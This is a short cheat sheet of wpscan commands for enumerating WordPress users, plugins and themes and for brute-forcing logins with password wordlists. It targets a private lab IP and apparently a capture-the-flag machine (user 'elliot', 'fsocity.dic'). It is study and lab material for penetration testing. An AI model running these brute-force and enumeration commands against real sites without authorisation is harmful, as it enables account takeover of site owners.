# WordPress Commands
Commands for enumerating and attacking WordPress sites

## Add host to /etc/hosts
```bash copy
sudo nano /etc/hosts
```
- Opens `/etc/hosts` to add the target IP for name resolution.

## Enumerate WordPress
```bash copy
wpscan --url http://10.10.10.10/wordpress -e
```
- Enumerates users, plugins, and themes on a WordPress site.
- `--url http://10.10.10.10/wordpress`: Specifies the target URL.
- `-e`: Enables enumeration.

## Brute-force WordPress login
```bash copy
wpscan --url http://10.10.10.10/wordpress -U admin -P /usr/share/wordlists/rockyou.txt
```
- Attempts to brute-force the admin login using a wordlist.
- `--url http://10.10.10.10/wordpress`: Specifies the target URL.
- `-U admin`: Specifies the username.
- `-P /usr/share/wordlists/rockyou.txt`: Specifies the password wordlist.

## Brute-force with specific user and wordlist
```bash copy
wpscan --url http://10.10.10.10 -P /home/arek/Downloads/fsocity.dic -U elliot
```
- Brute-forces the WordPress login for user `elliot` with a custom wordlist.
- `--url http://10.10.10.10`: Specifies the target URL.
- `-P /home/arek/Downloads/fsocity.dic`: Specifies the custom wordlist.
- `-U elliot`: Specifies the username.